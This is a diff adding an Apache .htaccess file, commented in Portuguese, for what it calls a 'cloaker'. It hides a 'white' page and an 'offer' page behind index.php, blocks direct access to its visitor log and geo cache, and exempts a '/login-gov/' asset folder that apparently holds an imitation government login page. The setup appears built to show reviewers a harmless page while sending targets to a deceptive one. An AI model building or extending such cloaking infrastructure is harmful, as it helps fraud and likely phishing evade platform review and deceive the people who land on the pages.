@@ -1,0 +1,107 @@
+# ============================================================
+# CLOAKER PHP ULTRA LEVE - REGRAS DE PROTEÇÃO E ROTEAMENTO
+# ============================================================
+
+# Motor de reescrita
+RewriteEngine On
+
+# ============================================================
+# PROTEÇÃO: Bloqueia acesso direto a arquivos sensíveis
+# ============================================================
+
+# Bloqueia config.php
+<Files "config.php">
+    Order Allow,Deny
+    Deny from all
+</Files>
+
+# Bloqueia functions.php
+<Files "functions.php">
+    Order Allow,Deny
+    Deny from all
+</Files>
+
+# Bloqueia visits.log
+<Files "visits.log">
+    Order Allow,Deny
+    Deny from all
+</Files>
+
+# Bloqueia geo_cache.json
+<Files "geo_cache.json">
+    Order Allow,Deny
+    Deny from all
+</Files>
+
+# Bloqueia offer.html (só pode ser servido via index.php)
+<Files "offer.html">
+    Order Allow,Deny
+    Deny from all
+</Files>
+
+# Bloqueia white.html (só pode ser servido via index.php)
+<Files "white.html">
+    Order Allow,Deny
+    Deny from all
+</Files>
+
+# ============================================================
+# ROTEAMENTO: Envia tudo para index.php
+# ============================================================
+
+# Não reescreve se for um arquivo real (imagens, CSS, JS, etc.)
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+
+# Ignora as pastas de assets
+RewriteCond %{REQUEST_URI} !^/images/ [NC]
+RewriteCond %{REQUEST_URI} !^/js/ [NC]
+RewriteCond %{REQUEST_URI} !^/css/ [NC]
+RewriteCond %{REQUEST_URI} !^/fonts/ [NC]
+RewriteCond %{REQUEST_URI} !^/login-gov/ [NC]
+
+# Não reescreve o dashboard
+RewriteCond %{REQUEST_URI} !^/dashboard\.php [NC]
+
+# Envia tudo para index.php (preservando query string)
+RewriteRule ^(.*)$ index.php [QSA,L]
+
+# ============================================================
+# ROTEAMENTO PRINCIPAL: index.html → index.php
+# ============================================================
+# Quando alguém acessa / ou /index.html, vai para index.php
+RewriteCond %{REQUEST_URI} ^/?$ [OR]
+RewriteCond %{REQUEST_URI} ^/index\.html$ [NC]
+RewriteRule ^(.*)$ index.php [QSA,L]
+
+# ============================================================
+# SEGURANÇA EXTRA
+# ============================================================
+
+# Desativa listagem de diretórios
+Options -Indexes
+
+# Esconde a versão do servidor
+ServerSignature Off
+
+# Headers de segurança
+<IfModule mod_headers.c>
+    Header set X-Content-Type-Options "nosniff"
+    Header set X-Frame-Options "SAMEORIGIN"
+    Header set X-XSS-Protection "1; mode=block"
+</IfModule>
+
+# Compressão GZIP para performance
+<IfModule mod_deflate.c>
+    AddOutputFilterByType DEFLATE text/html text/css application/javascript application/json
+</IfModule>
+
+# Cache de assets estáticos (1 semana)
+<IfModule mod_expires.c>
+    ExpiresActive On
+    ExpiresByType image/png "access plus 1 week"
+    ExpiresByType image/jpeg "access plus 1 week"
+    ExpiresByType image/gif "access plus 1 week"
+    ExpiresByType text/css "access plus 1 week"
+    ExpiresByType application/javascript "access plus 1 week"
+</IfModule>
